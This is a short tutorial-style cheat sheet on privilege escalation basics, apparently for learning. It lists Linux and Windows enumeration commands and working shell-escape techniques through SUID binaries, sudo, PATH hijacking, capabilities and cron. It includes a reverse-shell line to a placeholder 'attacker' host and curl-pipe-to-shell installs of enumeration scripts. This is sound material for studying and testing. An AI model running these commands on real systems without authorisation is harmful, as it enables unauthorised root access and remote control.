# LEARNING Skill: Privilege Escalation Basics

## Purpose
Learn privilege escalation fundamentals.

## Linux Privilege Model

### User Types
```
root       - UID 0, full access
system     - UID 1-999, services
regular    - UID 1000+, users
```

### Sudo
```bash
# Check sudo rights
sudo -l

# Sudo with command
sudo apt update
```

## Enumeration

### System Info
```bash
uname -a           # Kernel version
cat /etc/issue     # OS version
hostname
```

### Current User
```bash
id
whoami
groups
```

### Sudo Permissions
```bash
sudo -l
# Look for NOPASSWD
```

### SUID Files
```bash
find / -perm -4000 -type f 2>/dev/null
```

## Exploitation Vectors

### SUID Exploitation
```bash
# nmap
nmap --interactive
!sh

# vim
vim -c ':!/bin/sh'

# find
find . -exec /bin/sh -p \; -quit
```

### Sudo Exploitation
```bash
# python
sudo python -c 'import os; os.system("/bin/bash")'

# less/more
sudo less /etc/passwd
!/bin/sh
```

### Kernel Exploits
```bash
# Identify kernel
uname -r

# Search exploits
searchsploit kernel 3.13

# Example: dirtycow
```

## Path Hijacking

### Concept
```
If script runs "service" instead of "/usr/bin/service"
You can create /tmp/service first in PATH
```

### Exploitation
```bash
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
# Trigger vulnerable script
```

## Cron Jobs

### Find Cron
```bash
cat /etc/crontab
ls -la /etc/cron.d/
```

### Exploit
```bash
# If script in cron is writable
# Add reverse shell
echo '/bin/bash -i >& /dev/tcp/attacker/port 0>&1' >> /path/to/script
```

## Capabilities

### Check Capabilities
```bash
getcap -r / 2>/dev/null
```

### Exploit Capability
```bash
# If python has cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## GTFOBins

### Reference
```
https://gtfobins.github.io/

Contains:
- SUID binaries
- Sudo binaries
- Capabilities
- Cron jobs
```

## Tools

### LinPEAS
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### LinEnum
```bash
curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | sh
```

## Windows Basics

### Commands
```powershell
whoami /priv
whoami /groups
net user
net localgroup administrators
```

### Check for SeImpersonate
```powershell
whoami /priv | findstr SeImpersonate
# If enabled, can use potato exploits
```

## Checklist
```
[ ] System info
[ ] User permissions
[ ] Sudo rights
[ ] SUID files
[ ] Cron jobs
[ ] Capabilities
[ ] Writable paths
[ ] Kernel exploits
```
